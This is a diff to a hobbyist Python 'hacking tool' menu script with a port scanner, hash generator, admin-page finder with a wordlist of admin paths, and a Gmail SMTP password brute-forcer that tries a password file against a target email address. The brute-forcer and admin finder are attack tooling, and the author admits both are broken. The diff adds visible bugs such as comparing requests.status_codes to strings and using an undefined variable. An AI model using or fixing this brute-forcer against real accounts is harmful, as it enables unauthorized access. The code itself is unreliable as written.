@@ -1,10 +1,11 @@
 from colorama import *
-import random
 from time import sleep
+import random
 import socket
 import smtplib
 import hashlib
 import pyshorteners
+import requests
 
 # IF YOU HAVE ERROR WITH THIS FOLLOW THE STEP's :
 # 1- OPEN " CMD " BY CLICKING ON " WINDOWS + R "
@@ -40,10 +41,10 @@ print(Fore.LIGHTWHITE_EX + """
 | --------------------     -----------------               | 
 | [4] Admin Page Finder    [8] Strong Password Generator   |
 ------------------------------------------------------------
-
 """)
+print(Fore.LIGHTGREEN_EX + "### Num. 4 + 6 Don't Work\nSorry To Hear That );\n\n")
 
-value = input("[#] Choose Number : ")
+value = input(Fore.LIGHTWHITE_EX + "[#] Choose Number : ")
 
 ########################################
 
@@ -79,7 +80,7 @@ elif value == "2" :
     for port1 in portlist:
         sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         result = sock.connect_ex((ip_port,port1))
-        print(port1, ":", result)
+        print("{} :".format(port1), result)
         sock.close()
 
     coded()
@@ -90,6 +91,8 @@ elif value == "3" :
     | [1] md5         |
     | [2] sha1        |
     | [3] sha512      |
+    | [4] blake2b     |
+    | [5] sha3_256    |
     -------------------
     """)
     encrypt_type = input("[#] Which Type Of Encrypt You Want : ")
@@ -111,6 +114,18 @@ elif value == "3" :
         result = hashlib.sha512(en)
         print("[+] Your Hash : \n >> ", result.hexdigest())
 
+    elif encrypt_type == "4" :
+        encrypt = input("Word : ")
+        en = encrypt.encode()
+        result = hashlib.blake2b(en)
+        print("[+] Your Hash : \n >> ", result.hexdigest())
+
+    elif encrypt_type == "5" :
+        encrypt = input("Word : ")
+        en = encrypt.encode()
+        result = hashlib.sha3_256(en)
+        print("[+] Your Hash : \n >> ", result.hexdigest())
+
     else :
         print("[!] Invalid Syntax")
 
@@ -119,7 +134,8 @@ elif value == "3" :
 elif value == "4" :
     ex = print("EX. https://example.com/")
     page = input("[#] URL Here : ")
-    random_pages = ("""""" 'admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    random_pages = ("""""" 
+'admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
 'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
 'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
 'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
@@ -140,14 +156,23 @@ elif value == "4" :
 'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
 """""")
 
-    for admin in random_pages :
-        website = page + admin
-        # must be some changes here - WEB BROWSER CHECK IF VALID OR NOT
-        if website == page :
+    for admin1 in random_pages :
+## Here is an Error That i Cant Solve it: 
+## All of the URL's you enter you'll get "ADMIN PAGE NOT FOUND"
+
+        website = page + admin1
+        if requests.status_codes == "200" :
             print(Fore.GREEN + "[+] Admin Page Found >> ", website)
+
+        elif requests.status_codes == "305" :
+            print(Fore.BLUE + "[?] This Page Needs Proxy >> ", website)
+        
+        elif requests.status_codes == "423" :
+            print(Fore.BLUE + "[?] This Page is Locked >> ", website)
+
         else :
-            sleep(0.5)
-            print(Fore.RED + "[!] Admin Page Not Found >> ", website)
+            sleep(0.4)
+            print(Fore.RED + "[!] Admin Page Not Found or Connect Error >> ", website)
 
     coded()
 
@@ -168,6 +193,9 @@ elif value == "6" :
 
     num_email = input("\n [#] Choose Number : ")
 
+## Also There is an Error that i cant Specified, 
+## if the password is correct or not you'll get one answer which is it "PASSWORD INCORRECT"
+
     if num_email == "1" :
         design()
         smtpserver = smtplib.SMTP("smtp.gmail.com",587)
@@ -175,19 +203,23 @@ elif value == "6" :
         smtpserver.starttls()
 
         email1 = input("[*] Enter The Target Email : ")
-        Passwordfile = input("[*] Enter Password File : ")
+        passwordfile = input("[*] Enter Password File : ")
         design()
-        Passwordfile_open = open(Passwordfile, "r")
+        passwordfile_open = open(passwordfile, "r")
 
-        for Password1 in Passwordfile_open :
+        for Password1 in passwordfile_open :
             try :
                 smtpserver.login(email1, Password1)
-                print(Fore.GREEN + "[+] Password Found >> ",Password1)
+                print(Fore.GREEN + "[+] Password Found >> ",password1)
                 break
 
             except smtplib.SMTPAuthenticationError :
-                print(Fore.RED + "[!] Password Incorrecr >> ", Password1)
+                print(Fore.RED + "[!] Password Incorrect >> ", password1)
+        coded()
 
+    else :
+        design()
+        print(Fore.RED + "\n [!] Invalid Syntax")
         coded()
 
  ###
@@ -217,4 +249,8 @@ elif value == "8" :
         design()
         print( Fore.LIGHTGREEN_EX + "[+] ", password)
 
+    coded()
+
+else :
+    print(Fore.LIGHTCYAN_EX + "You Didn't Choose Number\n [!] Rerun The Program (:")
     coded()
